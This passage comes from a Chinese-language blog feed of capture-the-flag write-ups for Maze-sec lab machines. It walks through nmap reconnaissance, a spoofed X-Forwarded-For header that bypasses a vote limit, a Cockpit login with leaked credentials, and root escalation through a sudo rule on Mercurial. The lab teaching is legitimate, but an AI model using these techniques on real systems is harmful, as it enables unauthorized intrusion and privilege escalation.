class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Maze:~# find / -name user.txt<br>/srv/tftp/user.txt<br>root@Maze:~# <span class="hljs-built_in">cat</span> /srv/tftp/user.txt <br>flag&#123;user-4e79af9d9b43464228ae1100839a2575&#125;<br>username:bamuwe<br>need:bruteforce<br>root@Maze:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-6195bd8a9d755a41e493440a804f46d4&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cms-grav</tag>
      
      <tag>ssh爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Login</title>
    <link href="/Maze-sec/Login/"/>
    <url>/Maze-sec/Login/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/login]<br>└─# nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 18:05 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00039s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00028s latency).<br>MAC Address: 08:00:27:EA:4D:3E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00052s latency).<br>MAC Address: 08:00:27:B1:97:C1 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.14 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.10</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/login]<br>└─# nmap --min-rate 10000 -p- 192.168.2.10                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 18:05 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00019s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9090/tcp open  zeus-admin<br>MAC Address: 08:00:27:B1:97:C1 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 4.42 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、9090</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/login]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,9090 192.168.2.10<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 18:12 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00048s latency).<br><br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http            Apache httpd 2.4.62 ((Debian))<br>|_http-title: \xE6\x9C\xAA\xE6\x9D\xA5\xE9\xA1\xB9\xE7\x9B\xAE\xE6\x8A\x95\xE7\xA5\xA8\xE7\xB3\xBB\xE7\xBB\x9F<br>|_http-server-header: Apache/2.4.62 (Debian)<br>9090/tcp open  ssl/zeus-admin?<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent <span class="hljs-keyword">time</span><br>| ssl-cert: Subject: commonName=moban/organizationName=52a22a6e47cb4a5995fb43c3554baa0e<br>| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost<br>| Not valid before: 2025-09-07T11:51:54<br>|_Not valid after:  2026-09-07T11:51:54<br>| fingerprint-strings: <br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.1 400 Bad request<br>|     Content-Type: text/html; charset=utf8<br>|     Transfer-Encoding: chunked<br>|     X-DNS-Prefetch-Control: off<br>|     Referrer-Policy: no-referrer<br>|     X-Content-Type-Options: nosniff<br>|     Cross-Origin-Resource-Policy: same-origin<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;title&gt;<br>|     request<br>|     &lt;/title&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>&gt;<br>|     &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>|     &lt;style&gt;<br>|     body &#123;<br>|     margin: 0;<br>|     font-family: <span class="hljs-string">&quot;RedHatDisplay&quot;</span>, <span class="hljs-string">&quot;Open Sans&quot;</span>, Helvetica, Arial, sans-serif;<br>|     font-size: 12px;<br>|     line-height: 1.66666667;<br>|     color: <span class="hljs-comment">#333333;</span><br>|     background-color: <span class="hljs-comment">#f5f5f5;</span><br>|     border: 0;<br>|     vertical-align: middle;<br>|     font-weight: 300;<br>|_    margin: 0 0 10p<br>...<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 177.13 seconds<br></code></pre></td></tr></table></figure><ol><li>22端口：ssh服务</li><li>80端口：http服务</li><li>9090端口：zeus-admin服务</li></ol><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/login]<br>└─# nmap -sU --top-ports 100 192.168.2.10                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 18:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00068s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:B1:97:C1 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 101.19 seconds<br></code></pre></td></tr></table></figure><p>没有开放的UDP端口</p><h3 id="4-脚本漏洞扫描"><a href="#4-脚本漏洞扫描" class="headerlink" title="4.脚本漏洞扫描"></a>4.脚本漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec/login]<br>└─# nmap --script=vuln -p22,80,9090 192.168.2.10<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 18:08 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.10<br>Host is up (0.00043s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.10</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.10:80/vote/index.php</span><br><span class="hljs-string">|     Form id: vote_count</span><br><span class="hljs-string">|     Form action: vote.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.10:80/vote/vote.php</span><br><span class="hljs-string">|     Form id: vote_count</span><br><span class="hljs-string">|_    Form action: vote.php</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>9090/tcp open  zeus-admin<br>MAC Address: 08:00:27:B1:97:C1 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 40.76 seconds<br></code></pre></td></tr></table></figure><p>只扫出80端口可能存在<code>csrf</code></p><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口渗透"><a href="#1、80端口渗透" class="headerlink" title="1、80端口渗透"></a>1、80端口渗透</h2><p>访问80端口，是一个投票系统<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141817606.png">进入查看发现：</p><ul><li>每个IP只能投10票</li><li>一个只能投10票</li></ul><h3 id="投票限制绕过"><a href="#投票限制绕过" class="headerlink" title="投票限制绕过"></a>投票限制绕过</h3><p>尝试投票到1000，看看是否会有什么变化<br>投票系统页面显示着投票的IP，尝试使用不同的IP去进行投票</p><p> <code>X-Forwarded-For</code> 是一个 HTTP 头部字段，用于标识通过代理服务器连接到 Web 服务器的客户端的原始 IP 地址。许多 Web 应用程序会信任这个头部来获取真实客户端 IP，但这可能被恶意利用来绕过基于 IP 的限制。</p><p>伪造请求头<code>X-Forwarded-For</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /vote/vote.php HTTP/1.1<br>Host: 192.168.2.12<br>Content-Length: 19<br>Cache-Control: max-age=0<br>X-Forwarded-For: 192.168.2.$1$<br>Accept-Language: zh-CN,zh;q=0.9<br>...<br></code></pre></td></tr></table></figure><p>使用 BurpSuite 的 Intruder 模块，在 <code>X-Forwarded-For</code> 头部插入 payload，设置数值范围为 0-255，模拟不同 IP 地址进行批量投票，点击开始攻击。</p><p>解锁隐藏信息：<code>pencek:d032fc2b8b</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141834758.png"></p><h2 id="2、9090端口渗透"><a href="#2、9090端口渗透" class="headerlink" title="2、9090端口渗透"></a>2、9090端口渗透</h2><p>访问9090端口，是一个<code>Cockpit服务</code>，这是一个基于 Web 的 Linux 系统管理工具。<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141839751.png"></p><h1 id="三、Cockpit服务利用"><a href="#三、Cockpit服务利用" class="headerlink" title="三、Cockpit服务利用"></a>三、Cockpit服务利用</h1><p>Cockpit 是一个服务器管理工具, 可以方便地通过浏览器来管理 Linux 服务器。在终端和 web 工具间自由切换。通过 Cockpit 启动的服务可以通过终端停止。同样，如果在终端中发生错误, 也可以在 Cockpit 的日志接口中看到。</p><p>使用上面获取到的凭证<code>pencek:d032fc2b8b</code>登录<code>cockpit</code>，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141842422.png"></p><p>直接获取到<code>pence</code>权限<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141843007.png"></p><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><h2 id="1、获取todd权限"><a href="#1、获取todd权限" class="headerlink" title="1、获取todd权限"></a>1、获取todd权限</h2><p>查看web应用的配置文件，在<code>config.php</code>里面找到另外一个用户<code>todd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">pencek@Login:/var/www/html/vote$ <span class="hljs-built_in">cat</span> config.php <br>&lt;?php<br>// 隐藏信息配置<br>define(<span class="hljs-string">&#x27;SECRET_INFO&#x27;</span>, <span class="hljs-string">&#x27;pencek:d032fc2b8b&#x27;</span>);<br>define(<span class="hljs-string">&#x27;REQUIRED_VOTES&#x27;</span>, 1000);  // 需要达到1000票才显示信息<br>define(<span class="hljs-string">&#x27;SALT&#x27;</span>, <span class="hljs-string">&#x27;your_random_salt_value_here&#x27;</span>);<br>define(<span class="hljs-string">&#x27;todd&#x27;</span>,<span class="hljs-string">&#x27;1213562e5cf594899d1348&#x27;</span>);<br>...<br></code></pre></td></tr></table></figure><p>使用获取到的凭证<code>todd:1213562e5cf594899d1348</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pencek@Login:/var/www/html/vote$ su todd<br>Password: <br>todd@Login:/var/www/html/vote$ <span class="hljs-built_in">id</span><br>uid=1001(todd) gid=1001(todd) <span class="hljs-built_in">groups</span>=1001(todd)<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo</code>属性</p><figure class="highlight plaintext"><figcaption><span>sudo -l</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bashtodd@Login:/var/www/html/vote$">Matching Defaults entries for todd on Login:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User todd may run the following commands on Login:<br>    (ALL) NOPASSWD: /usr/bin/hg<br></code></pre></td></tr></table></figure><p>找到<code>/usr/bin/hg</code>不需要密码即可执行root权限</p><p><code>Mercurial (hg)</code> 是一个分布式版本控制系统。当系统管理员配置不当，允许用户以 sudo 权限执行 hg 命令时，攻击者可能利用 hg 的某些功能来执行任意命令。</p><p>查看hg的帮助信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141853306.png"><br>发现出现了<code>vim</code>编辑器的页面，那么使用<code>vim</code>的提取方式进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">todd@Login:/var/www/html/vote$ <span class="hljs-built_in">sudo</span> /usr/bin/hg -h<br>Mercurial Distributed SCM<br>...<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509141854555.png"></p><p>成功获取到root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Login:/var/www/html/vote# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、获取FLAG"><a href="#五、获取FLAG" class="headerlink" title="五、获取FLAG"></a>五、获取FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Login:~# <span class="hljs-built_in">cat</span> /home/pencek/user.txt /root/root.txt <br>flag&#123;user-d032fc2b8b1213562e5cf594899d1348&#125;<br>flag&#123;root-e07910a06a086c83ba41827aa00b26ed&#125;<br>root@Login:~# <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cockpit服务</tag>
      
      <tag>sudo-hg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Halfhour</title>
    <link href="/Maze-sec/Halfhour/"/>
    <url>/Maze-sec/Halfhour/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00052s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00040s latency).<br>MAC Address: 08:00:27:E4:01:05 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.14<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:F7:91:CD (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.22 seconds<br></code></pre></td></tr></table></figure><p>靶机IP为：<code>192.168.2.14</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.14<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.14<br>Host is up (0.00038s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>1337/tcp open  waste<br>1338/tcp open  wmc-log-svc<br>MAC Address: 08:00:27:F7:91:CD (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.15 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、1337、1338</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,1337,1338 192.168.2.14<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 15:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.14<br>Host is up (0.0012s latency).<br><br>PORT     STATE SERVICE      VERSION<br>22/tcp   open  ssh          OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http         Apache httpd 2.4.62 ((Debian))<br>|_http-title: \xE6\xAD\xA3\xE5\x9C\xA8\xE8\xB7\xB3\xE8\xBD\xAC\xE5\x88\xB0 Maze <br>|_http-server-header: Apache/2.4.62 (Debian)<br>1337/tcp open  waste?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: <br>|     Please enter password: Incorrect password. Attempts left: 2<br>|   NULL: <br>|_    Please enter password:<br>1338/tcp open  wmc-log-svc?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: <br>|     Please send new password: <br>|     Congratulations! Password reset successful!<br>|     password: bobobo<br>|   NULL: <br>|_    Please send new password:<br>MAC Address: 08:00:27:F7:91:CD (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 160.26 seconds<br></code></pre></td></tr></table></figure><ol><li>22端口，ssh服务</li><li>80端口，http服务</li><li>1337、1338端口，未知的服务，在1338端口泄露一个密码<code>bobobo</code></li></ol><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap -sU --top-ports 100 192.168.2.14                              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 15:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.14<br>Host is up (0.00060s latency).<br>All 100 scanned ports on 192.168.2.14 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 56 closed udp ports (port-unreach), 44 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:F7:91:CD (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.79 seconds<br></code></pre></td></tr></table></figure><p>没有开放的udp端口</p><h3 id="4-脚本漏洞扫描"><a href="#4-脚本漏洞扫描" class="headerlink" title="4.脚本漏洞扫描"></a>4.脚本漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec/maze-sec]<br>└─# nmap --script=vuln -p22,80,1337,1338 192.168.2.14              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-17 15:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.14<br>Host is up (0.00042s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">1337/tcp open  waste</span><br><span 